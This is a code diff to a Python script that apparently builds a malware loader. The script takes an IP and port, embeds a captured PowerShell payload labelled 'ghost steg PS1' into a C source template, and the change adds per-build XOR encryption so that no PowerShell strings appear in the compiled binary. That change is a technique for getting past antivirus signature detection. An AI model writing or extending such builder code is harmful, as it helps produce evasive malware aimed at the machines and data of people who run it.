@@ -84,21 +84,29 @@ def build(ip, port):
     os.remove(ps1_tmp)
     ok(f"Payload captured: {len(payload_bytes)} bytes")
 
-    # ── Step 4: format as C byte array ────────────────────────────────────
+    # ── Step 4: XOR-encrypt with random key (new key every build) ─────────
+    import random
+    xor_key = random.randint(1, 255)
+    enc_bytes = bytes(b ^ xor_key for b in payload_bytes)
+    ok(f"XOR key: 0x{xor_key:02x} — payload encrypted, no PS1 strings in binary")
+
+    # ── Step 5: format encrypted bytes as C byte array ────────────────────
     hex_parts = []
-    for i, b in enumerate(payload_bytes):
+    for i, b in enumerate(enc_bytes):
         if i % 16 == 0:
             hex_parts.append("\n    ")
         hex_parts.append(f"0x{b:02x}, ")
     hex_array = "".join(hex_parts).strip().rstrip(",")
 
-    # ── Step 5: inject into template ──────────────────────────────────────
+    # ── Step 6: inject into template ──────────────────────────────────────
     with open(TEMPLATE, "r", encoding="utf-8") as f:
         template = f.read()
 
     c_source = template.replace(
+        "/* XOR_KEY_VALUE */", f"0x{xor_key:02x}"
+    ).replace(
         "    /* PAYLOAD_BYTES */\n    0x00",
-        f"    /* {len(payload_bytes)} bytes — ghost steg PS1 */\n    {hex_array}"
+        f"    /* {len(enc_bytes)} bytes XOR-encrypted, key=0x{xor_key:02x} */\n    {hex_array}"
     )
 
     with open(OUTPUT_C, "w", encoding="utf-8") as f:
